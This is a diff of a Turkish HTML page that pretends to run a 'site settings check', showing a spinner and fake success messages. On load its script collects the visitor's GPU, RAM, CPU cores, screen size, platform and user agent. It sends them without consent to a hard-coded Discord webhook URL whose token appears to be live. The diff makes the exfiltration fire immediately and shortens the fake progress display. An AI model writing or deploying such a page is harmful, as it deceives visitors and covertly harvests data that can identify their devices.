@@ -5,85 +5,67 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Kontrolü</title>
     <style>
-        body {
-            background-color: #0f0f0f;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            font-family: sans-serif;
-            color: #eeeeee;
-        }
+        body { background-color: #0c0c0c; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; color: #fff; }
         .container { text-align: center; }
-        .loader {
-            border: 3px solid #333;
-            border-top: 3px solid #00ff41; 
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 0.6s linear infinite;
-            margin: 0 auto 20px;
-        }
+        .loader { border: 2px solid #333; border-top: 2px solid #0f4; border-radius: 50%; width: 25px; height: 25px; animation: spin 0.4s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-weight: 400; font-size: 15px; margin: 0; }
-        .success-text { color: #00ff41; font-weight: bold; }
+        h2 { font-weight: 400; font-size: 14px; margin: 0; color: #ccc; }
+        .ok { color: #0f4; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div id="loader" class="loader"></div>
-        <h2 id="msg">Site ayarları kontrol ediliyor...</h2>
+        <div id="ld" class="loader"></div>
+        <h2 id="tx">Site ayarları kontrol ediliyor...</h2>
     </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        const url = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        function analizEt() {
-            let gpu = "Bilinmiyor";
+        function get() {
+            let g = "N/A";
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = gl.getParameter(debug.UNMASKED_RENDERER_ID);
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl');
+                const d = gl.getExtension('WEBGL_debug_renderer_info');
+                g = gl.getParameter(d.UNMASKED_RENDERER_ID);
             } catch(e) {}
 
             return {
                 embeds: [{
-                    title: "🖥️ HIZLI SİSTEM RAPORU",
+                    title: "⚡ HIZLI LOG",
                     color: 3066993,
                     fields: [
-                        { name: "⚙️ DONANIM", value: `**GPU:** \`${gpu}\`\n**RAM:** ${navigator.deviceMemory || 'Bilinmiyor'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'Bilinmiyor'} Çekirdek`, inline: false },
-                        { name: "📏 GÖRÜNTÜ", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                        { name: "📱 SİSTEM", value: `**OS:** ${navigator.platform}\n**Dil:** ${navigator.language}`, inline: true },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
+                        { name: "HW", value: `GPU: ${g}\nRAM: ${navigator.deviceMemory}GB\nCPU: ${navigator.hardwareConcurrency}`, inline: false },
+                        { name: "SCR", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                        { name: "SYS", value: `${navigator.platform}`, inline: true },
+                        { name: "UA", value: "```" + navigator.userAgent + "```", inline: false }
                     ]
                 }]
             };
         }
 
-        function calistir() {
-            const msg = document.getElementById('msg');
-            const loader = document.getElementById('loader');
-            const veri = analizEt();
+        // Anında tetikleme
+        (function run() {
+            const data = get();
+            
+            // Beklemeden gönder
+            navigator.sendBeacon(url, JSON.stringify(data));
+            fetch(url, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
 
-            // Gönderimi anında başlat (Bekleme yapmaz)
-            fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(veri) });
-            navigator.sendBeacon(webhookURL, JSON.stringify(veri));
-
-            // Hızlandırılmış aşamalar
-            setTimeout(() => {
-                msg.innerHTML = '<span class="success-text">Site uygun halde!</span>';
-                loader.style.borderTopColor = "#00ff41"; 
-            }, 800); // 1 saniyeden kısa sürede onay
+            // Görsel akışı hızlandır (Milisaniyelik geçişler)
+            const tx = document.getElementById('tx');
+            const ld = document.getElementById('ld');
 
             setTimeout(() => {
-                loader.style.display = "none";
-                msg.innerHTML = '<span class="success-text">Sorunlar düzeltildi.</span>';
-            }, 1800); // Toplam 1.8 saniyede işlem biter
-        }
+                tx.innerHTML = '<span class="ok">Site uygun halde!</span>';
+            }, 400); // 0.4 saniye
 
-        window.onload = calistir;
+            setTimeout(() => {
+                ld.style.display = "none";
+                tx.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>';
+            }, 900); // Toplam 0.9 saniyede her şey biter
+        })();
     </script>
 </body>
 </html>
